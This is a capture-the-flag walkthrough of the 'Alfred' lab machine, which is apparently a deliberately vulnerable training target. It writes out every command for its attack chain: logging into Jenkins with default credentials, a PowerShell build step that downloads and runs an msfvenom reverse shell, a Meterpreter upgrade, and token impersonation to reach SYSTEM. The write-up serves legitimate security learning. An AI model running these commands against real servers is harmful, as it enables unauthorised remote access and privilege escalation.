# Alfred

## Recon
Since as the task description highlights, the server doesn't respond to ICMP requests, we need to add `-Pn` to nmap:   
`sudo nmap -Pn -T5 -sV [IP]` which gives us the following:
```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-13 00:18 CEST
Nmap scan report for 10.10.253.76
Host is up (0.072s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
3389/tcp open  tcpwrapped
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 381.55 seconds
```

Looking at the webserver there is nothing interesting, may do a gobuster enumeration later if needed.

Looking at port 8080 however gives us a Jenkins login screen.

Let's try some weak credentials:
 - the default `admin:password` is not working
 - a second try with `admin:admin` however is a success, we don't need to brute force

## Getting a shell

Ok, so we are in jenkins, so let's find a way to gain access to a shell.

We could start by looking up exploits, but a quick look around in the project gives us this:
![image](https://github.com/dudasaron/WriteUps/assets/6893357/b0ea6bdc-7ab8-4dd6-be64-73a94ce04924)
 
 So it looks like we just need to prepare our payload and we can run it from here.

 We can see from the port scanning, that the server runs IIS, so it's safe to guess it's a windows machine, so `msfvenom -p windows/x64/shell_reverse_tcp LHOST=[OUR IP] LPORT=4444 -f exe -o RevShell.exe`
 
 So let's start a webserver to serve the file: `python -m http.server 9000`
 
 And don't forget our listener: `nc -nvlp 4444`

After a little bit of trial and error this is what worked: 
```cmd
whoami
: Download the file
powershell -c "(New-Object System.Net.WebClient).DownloadFile(\"http://[your ip]:9000/RevShell.exe\", \"RevShell.exe\")"
: Make it executable
icacls RevShell.exe /grant Everyone:F
: And run it
start RevShell.exe 
```

And go back to the project in Jenkins and click on "Build now" from the left menu. You may check the console outpout if you open the build.

So we have a user shell on the machine: 
```cmd
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\Jenkins\workspace\project>whoami
whoami
alfred\bruce

C:\Program Files (x86)\Jenkins\workspace\project>
```

Only thing left for this block is to get our user flag: `more c:\Users\bruce\Desktop\user.txt`


## Upgrading to meterpreter

Let's create our pmeterpreter payload as prompted by the task description: `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o meterpreter-shell.exe`. Make sure to use a different port then your original reverse shell!

And start our python http server same as before if it's not running still.

Then download same as before: `powershell "(New-Object System.Net.WebClient).Downloadfile('http://[IP]:9000/meterpreter-shell.exe','meterpreter-shell.exe')"`

Let's not forget to start the listener in the msfconsole: 
```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [your ip]
set LPORT [port set in msfvenom]
run
```

Now we can start the connection with `start meterpreter-shell.exe` on our initial reverse shell. And now we should receive the meterpreter session in msfconsole.

## Privilege escalation

First let's check our privileges: `whoami /priv`. (Either in the original command line, or start a shell in meterpreter by `shell`)
```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
...
SeDebugPrivilege                Debug programs                            Enabled 
...
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
...
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
...
```
(Disabled privileges are omitted here)

What's important for us here is the `SeDebugPrivilege` and the `SeImpersonatePrivilege`.

Let's load the [incognito module](https://www.offsec.com/metasploit-unleashed/fun-incognito/) to exploit these privileges.

To check what is available, run `list_tokens -g`: 
```
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT SERVICE\AudioEndpointBuilder
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\PcaSvc
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\TrkWks
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\WdiSystemHost
NT SERVICE\Winmgmt
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
No tokens available
```

Let's try to with `BUILTIN\Administrators`: `impersonate_token "BUILTIN\Administrators"` and check if everything as should be with `getuid`.

To solidify our access and ensure we have not only have a privileged token, but we are running as a privileged user too, find a process and migrate to it: run `ps` to see the running processes.
```
Process List
============

 PID   PPID  Name                    Arch  Session  User                          Path
 ---   ----  ----                    ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                  x64   0
...
 1212  668   spoolsv.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
...
 2956  524   conhost.exe             x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
 2964  668   TrustedInstaller.exe    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
 3040  668   svchost.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
```

Let's pick a process with `NT AUTHORITY\SYSTEM` as User and run `migrate [PID]`. In this case let's pick `spoolsv.exe`.

Now we can grab our root flag too: `cat c:/Windows/System32/config/root.txt` (Note that in meterpreter we need to use the unix styled forward slashes, instead of the windows styled backslashes)

## Notes

We probably should have started with meterpreter payload in the _Getting a shell_ section, but for the sake of practice we started out with a regular reverse cmd shell.

